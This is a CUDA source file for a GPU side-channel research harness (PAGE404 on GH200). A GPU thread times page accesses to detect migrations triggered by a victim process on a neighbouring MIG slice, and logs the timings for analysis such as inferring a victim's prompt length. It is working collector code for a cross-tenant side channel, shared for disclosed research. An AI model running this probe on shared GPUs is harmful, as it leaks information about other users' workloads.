// =============================================================================
// migration_delay_side_channel.cu — PAGE404 migration-delay collector
//
// Shared data-collection tool for the PAGE404 side-channel PoCs on the NVIDIA
// GH200 (Hopper, sm_90). Research artifact for a published, responsibly
// disclosed result; it is a measurement harness, not a deployable attack.
//
// Idea: a single GPU thread walks a large host-mapped buffer one 128 KB page at
// a time, repeatedly timing accesses to each page. When a victim process on a
// neighbouring MIG slice triggers a page migration, the attacker's subsequent
// access to that page becomes briefly fast (the line is pulled local). The tool
// records, for each page, how long that took ("migration delay") and how many
// accesses were issued before the fast access was seen ("access counter").
// The resulting per-page time series is the raw side-channel signal; downstream
// Python analyzes it (e.g. to estimate a victim prompt's length).
//
// Output: two text files, one integer per line (skipping zero entries):
//   argv[1] : migration-delay timestamps (clock64 cycles)
//   argv[2] : access counter at the point the fast access was detected
//
// Usage:
//   migration_delay_side_channel <time_out> <counter_out> [mem_size] [N]
//     mem_size : buffer size, accepts suffixes (e.g. 90GB, 128MB). Default 128MB.
//     N        : accesses probed per page before giving up. Default 256.
//
// Build:  see ../build.sh   (nvcc -O3 -std=c++17 -arch=sm_90)
// =============================================================================

#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <string>
#include <algorithm>
#include <stdexcept>
#include <limits>
#include <cctype>
#include <cmath>
#include <cinttypes>
#include <sys/mman.h>
#include <cuda_runtime.h>

// Size-unit helpers.
#define GB(X) ((unsigned long)((X) * 1024L * 1024L * 1024L))
#define MB(X) ((X) * 1024L * 1024L)
#define KB(X) ((X) * 1024L)

#define MemSize     (MB(128))   // default buffer size if none given
#define strideSize  (128)       // bytes; one cache line
#define FAST_ACCESS_THRESHOLD 850   // cycles: access faster than this == migrated

#define gpuErrchk(ans) { gpuAssert((ans), __FILE__, __LINE__); }
inline void gpuAssert(cudaError_t code, const char *file, int line, bool abort = true)
{
    if (code != cudaSuccess) {
        fprintf(stderr, "GPUassert: %s %s %d\n", cudaGetErrorString(code), file, line);
        if (abort) exit(code);
    }
}

// ---------------------------------------------------------------------------
// Active collector kernel (launched with <<<1,1>>>).
//
// Single thread. For each 128 KB page: prime it with N accesses, then probe it
// up to N more times, timing each probe. The first probe faster than
// FAST_ACCESS_THRESHOLD marks a migration; its timestamp and probe index are
// recorded and the thread advances to the next page.
// ---------------------------------------------------------------------------
__global__ void collect1p(uint32_t* pointer, uint32_t* dummy, uint64_t* time,
                          uint64_t* Access_counter, uint64_t num_total_elements,
                          int N, size_t number_of_samples)
{
    uint64_t start, end;
    uint64_t sum = 0;
    uint64_t kk  = 0;

    uint64_t migration_start_time = 0;
    uint64_t migration_end_time   = 0;
    size_t   time_event = 0;

    // Offset chosen from the thread id to defeat compiler constant-folding.
    uint64_t temp       = (uint64_t)threadIdx.x * sizeof(uint32_t) * 8;
    size_t   page_size  = 128 * 1024;                  // 128 KB
    size_t   page_elems = page_size / sizeof(uint32_t);
    uint32_t value;

    while (time_event < number_of_samples && temp < num_total_elements) {
        uint32_t* p = &pointer[temp];

        // Prime the page with N accesses.
        kk = 0;
        while (kk < N) {
            asm volatile ("ld.volatile.global.u32 %0, [%1];" : "=r"(value) : "l"(p));
            kk++;
        }

        // Probe the same page, timing each access; stop at the first fast one.
        asm volatile ("mov.u64 %0, %%clock64;" : "=l"(migration_start_time));
        kk = 0;
        while (kk < N) {
            asm volatile ("mov.u64 %0, %%clock64;" : "=l"(start));
            asm volatile ("ld.volatile.global.u32 %0, [%1];" : "=r"(value) : "l"(p));
            sum += value;
            asm volatile ("mov.u64 %0, %%clock64;" : "=l"(end));

            if (end - start < FAST_ACCESS_THRESHOLD) {
                asm volatile ("mov.u64 %0, %%clock64;" : "=l"(migration_end_time));
                Access_counter[time_event] = kk;
                time[time_event]           = migration_end_time;  // absolute timestamp
                time_event++;
                break;   // move on to the next page
            }
            kk++;
        }
        temp += page_elems;
    }
    *dummy = sum;
}

// ---------------------------------------------------------------------------
// UNUSED alternative collector: a multi-threaded variant of the same probe.
// Not launched by main() (the commented launch below shows how it was driven);
// retained for reference / experiments.
// ---------------------------------------------------------------------------
__global__ void pointerchase(uint32_t* pointer, uint32_t* dummy, uint64_t* time,
                             uint64_t* Access_counter, uint64_t num_total_elements,
                             int num_accesses_trigger, int N, size_t number_of_samples)
{
    uint64_t start, end;
    uint64_t sum = 0;
    uint64_t kk  = 0;

    uint64_t migration_start_time = 0;
    uint64_t migration_end_time   = 0;

    int    tid        = threadIdx.x;
    size_t temp       = (uint64_t)tid * sizeof(uint32_t) * 8;   // defeat const-folding
    size_t page_size  = 128 * 1024;                             // 128 KB
    uint64_t page_elems = page_size / sizeof(uint32_t);
    size_t time_event = 0;
    uint32_t value;
    __syncthreads();

    while (temp < num_total_elements && time_event < number_of_samples) {
        __syncthreads();
        uint32_t* p = &pointer[temp];

        kk = 0;
        if (kk < num_accesses_trigger) {
            asm volatile ("ld.volatile.global.u32 %0, [%1];" : "=r"(value) : "l"(p));
            sum += value;
            asm volatile ("membar.gl;");
            kk++;
        }
        __syncthreads();

        if (tid == 0) {
            asm volatile ("mov.u64 %0, %%clock64;" : "=l"(migration_start_time));
            kk = 0;
            while (kk < N) {
                asm volatile ("mov.u64 %0, %%clock64;" : "=l"(start));
                asm volatile ("ld.volatile.global.u32 %0, [%1];" : "=r"(value) : "l"(p));
                sum += value;
                asm volatile ("membar.gl;");
                asm volatile ("mov.u64 %0, %%clock64;" : "=l"(end));

                if (end - start < FAST_ACCESS_THRESHOLD) {
                    asm volatile ("mov.u64 %0, %%clock64;" : "=l"(migration_end_time));
                    Access_counter[time_event] = kk;
                    time[time_event] = migration_end_time - migration_start_time;
                    time_event++;
                    break;
                }
                kk++;
            }
        }
        __syncthreads();
        temp += page_elems;
    }

    if (tid == 0) *dummy = sum;
}

static inline uint64_t parse_size(std::string s);

int main(int argc, char* argv[])
{
    if (argc < 3) {
        std::fprintf(stderr,
            "Usage: %s <time_out> <counter_out> [mem_size] [N]\n", argv[0]);
        return 1;
    }

    std::string timePath    = argv[1];   // migration-delay output file
    std::string counterPath = argv[2];   // access-counter output file

    size_t MemorySize = MemSize;
    int    N          = 256;             // default accesses probed per page

    if (argc >= 4) {
        try {
            MemorySize = parse_size(argv[3]);
            std::printf("Parsed %" PRIu64 " bytes\n", (uint64_t)MemorySize);
        } catch (const std::exception& e) {
            std::fprintf(stderr, "Error: %s\n", e.what());
            return 1;
        }
    }
    if (argc >= 5) {
        try {
            N = std::stoi(argv[4]);
        } catch (const std::exception& e) {
            std::fprintf(stderr, "Error: %s\n", e.what());
            return 1;
        }
    }

    size_t migration_size     = 128 * 1024;                 // 128 KB per page
    size_t number_of_samples  = MemorySize / migration_size;
    size_t num_total_elements = MemorySize / sizeof(uint32_t);

    // ---- Allocate the probe buffer (2 MB-aligned) and device outputs -----
    uint32_t* pointer;
    if (posix_memalign((void**)&pointer, MB(2), MemorySize) != 0) {
        perror("posix_memalign failed");
        return 1;
    }
    memset(pointer, 0, MemorySize);

    uint32_t *dummy_dev;
    gpuErrchk(cudaMalloc((void**)&dummy_dev, sizeof(uint32_t)));
    uint32_t *dummy_host = (uint32_t*) malloc(sizeof(uint32_t));

    uint64_t *time_dev, *Access_count_dev;
    gpuErrchk(cudaMalloc((void**)&time_dev,         number_of_samples * sizeof(uint64_t)));
    gpuErrchk(cudaMalloc((void**)&Access_count_dev, number_of_samples * sizeof(uint64_t)));
    uint64_t *time_host         = (uint64_t*) malloc(number_of_samples * sizeof(uint64_t));
    uint64_t *Access_count_host = (uint64_t*) malloc(number_of_samples * sizeof(uint64_t));

    gpuErrchk(cudaDeviceSynchronize());

    // ---- Run the collector, timing the kernel ----------------------------
    cudaEvent_t start, stop;
    cudaEventCreate(&start);
    cudaEventCreate(&stop);
    cudaEventRecord(start);

    collect1p<<<1, 1>>>(pointer, dummy_dev, time_dev, Access_count_dev,
                        num_total_elements, N, number_of_samples);
    gpuErrchk(cudaDeviceSynchronize());

    cudaEventRecord(stop);
    cudaEventSynchronize(stop);
    float ms = 0.0f;
    cudaEventElapsedTime(&ms, start, stop);
    printf("Kernel execution time: %.6f seconds\n", ms / 1000.0f);
    cudaEventDestroy(start);
    cudaEventDestroy(stop);

    // ---- Copy results back and write them out ----------------------------
    gpuErrchk(cudaMemcpy(dummy_host, dummy_dev, sizeof(uint32_t), cudaMemcpyDeviceToHost));
    gpuErrchk(cudaMemcpy(time_host, time_dev,
                         number_of_samples * sizeof(uint64_t), cudaMemcpyDeviceToHost));
    gpuErrchk(cudaMemcpy(Access_count_host, Access_count_dev,
                         number_of_samples * sizeof(uint64_t), cudaMemcpyDeviceToHost));
    printf("Dummy value: %u\n", *dummy_host);

    char line[100];
    FILE* fptr = fopen(timePath.c_str(), "w");
    if (!fptr) { perror("fopen time_out"); return 1; }
    for (size_t i = 0; i < number_of_samples; i++) {
        if (time_host[i] == 0) continue;
        snprintf(line, sizeof(line), "%lu\n", time_host[i]);
        fputs(line, fptr);
    }
    fclose(fptr);

    fptr = fopen(counterPath.c_str(), "w");
    if (!fptr) { perror("fopen counter_out"); return 1; }
    for (size_t i = 0; i < number_of_samples; i++) {
        if (Access_count_host[i] == 0) continue;
        snprintf(line, sizeof(line), "%lu\n", Access_count_host[i]);
        fputs(line, fptr);
    }
    fclose(fptr);

    return 0;
}

// Parse a human-readable size ("90GB", "128MB", "1024", "2.5GiB") to bytes.
// Accepts an optional decimal number and a binary unit suffix (powers of 1024);
// bare numbers are bytes. Throws std::exception on malformed input.
static inline uint64_t parse_size(std::string s) {
    auto not_space = [](unsigned char c){ return !std::isspace(c); };
    s.erase(s.begin(), std::find_if(s.begin(), s.end(), not_space));
    s.erase(std::find_if(s.rbegin(), s.rend(), not_space).base(), s.end());
    if (s.empty()) throw std::invalid_argument("empty size");

    // Split leading number from the unit suffix.
    size_t i = 0; bool seen_dot = false;
    for (; i < s.size(); ++i) {
        unsigned char c = (unsigned char)s[i];
        if (std::isdigit(c)) continue;
        if (c == '.' && !seen_dot) { seen_dot = true; continue; }
        break;
    }
    if (i == 0) throw std::invalid_argument("no number in size");
    double number = std::stod(s.substr(0, i));

    std::string suf = s.substr(i);
    suf.erase(std::remove_if(suf.begin(), suf.end(), ::isspace), suf.end());
    std::transform(suf.begin(), suf.end(), suf.begin(),
                   [](unsigned char c){ return (char)std::tolower(c); });

    uint64_t mul = 1;
    if      (suf.empty() || suf == "b")                   mul = 1ULL;
    else if (suf == "k" || suf == "kb" || suf == "kib")   mul = 1ULL << 10;
    else if (suf == "m" || suf == "mb" || suf == "mib")   mul = 1ULL << 20;
    else if (suf == "g" || suf == "gb" || suf == "gib")   mul = 1ULL << 30;
    else if (suf == "t" || suf == "tb" || suf == "tib")   mul = 1ULL << 40;
    else throw std::invalid_argument("unknown size suffix: '" + suf + "'");

    long double bytes_ld = (long double)number * (long double)mul;
    if (bytes_ld < 0.0L || bytes_ld > (long double)std::numeric_limits<uint64_t>::max())
        throw std::overflow_error("size out of range");
    return (uint64_t)llroundl(bytes_ld);
}
